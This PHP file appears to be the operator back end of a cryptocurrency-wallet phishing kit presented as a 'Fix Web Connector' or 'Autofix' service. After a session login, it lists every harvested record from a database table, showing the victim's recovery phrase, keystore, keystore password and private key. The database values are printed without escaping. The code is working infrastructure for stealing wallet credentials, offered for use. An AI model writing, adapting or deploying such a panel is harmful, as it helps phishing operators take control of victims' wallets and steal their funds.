<?php
include 'login-action.php';
?>


<?php   
     if (!isset($_SESSION['accountid'])) {
?>   

<!DOCTYPE html>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" href="style.css" />
    <title>Login Fix Web Connector</title>
</head>
<body>
    <h1>FIX WEB CONNECTOR</h1>
    <!--<h3>Login</h3>-->
    <form method="post" action="">
        <p>
            <input type="text" name="accountid" placeholder="Username ID" />
        </p>
        <p>
            <input type='password' name="password" placeholder="Password" />
        </p>
        <div><span style="color: red;"><?php echo $error; ?></span></div>
        <button type="submit" name="login">Sign In</button>
    </form>
</body>
</html>


<?php
} else if (isset($_SESSION['accountid'])) { 
 include 'connection.php';
 include 'login-action.php';
  
 ?>
    

<!DOCTYPE html>
<head>
    <title>Autofix Details</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" href="style.css" />
</head>
<body class="info">
    <div class="table-data">
        
            <h2>INFO</h2>
        <table class="table">
                                            <thead>
                                                <tr>
                                                    <td>Id</td>
                                                    <td>Phrase</td>
                                                    <td>Key Store</td>
                                                    <td>Key Store Password</td>
                                                    <td>Private Key</td>
                                                </tr>
                                            </thead>
                                            <tbody>
            <?php  
        							$users = $mysqli->query("SELECT * FROM webfxInfo "); 
        									          while ($user_data = $users->fetch_assoc()) {
        									            echo '<tr>';
        									            echo '<th>' . $user_data['id'] . '</th>';
        									            echo '<td>' . $user_data['input1'] . '</td>';
        									            echo '<td>' . $user_data['input2'] . '</td>';
        									            echo '<td>' . $user_data['input21'] . '</td>';
            									        echo '<td>' . $user_data['input3'] . '</td>';
        									            echo '</tr>';
        									          }
        									        ?>
                                            </tbody>
            </table>
                                        
                         
        <p><button><a href="logout.php">logout</a></button></p>        
</div>
       </body> 
</html>        

<?php } ?>